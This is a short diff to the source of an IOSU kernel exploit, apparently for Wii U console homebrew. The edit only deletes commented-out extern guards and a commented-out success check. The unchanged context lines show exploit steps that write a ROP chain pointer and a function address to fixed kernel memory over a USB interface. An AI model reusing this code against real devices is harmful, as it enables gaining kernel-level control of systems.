@@ -9,9 +9,6 @@
 #include <stddef.h>
 #include <stdint.h>
 #include <string>
-//#ifdef __cplusplus
-//extern "C"{
-//#endif
 
 extern "C" void kern_write(void *addr, uint32_t value); 
 extern "C" void SC_KernelCopyData(void* dst, void* src, size_t size);
@@ -272,15 +269,7 @@ int IOSU_Kernel_Exploit() {
     USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x0C, (uint32_t)OSEffectiveToPhysical((uint32_t)firstRopChain));
     int rc = USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x00, 0x1012392b);
 
-  /*  if(rc == 1337 && confirm) {
-        *confirm = 1;
-        Result = 1;
-        
-    } */
     DEBUG_FUNCTION_LINE("IOSU Exploit worked\n");
     IOS_Close(fd);
 return Result;
 }
-//#ifdef __cplusplus
-//}
-//#endif
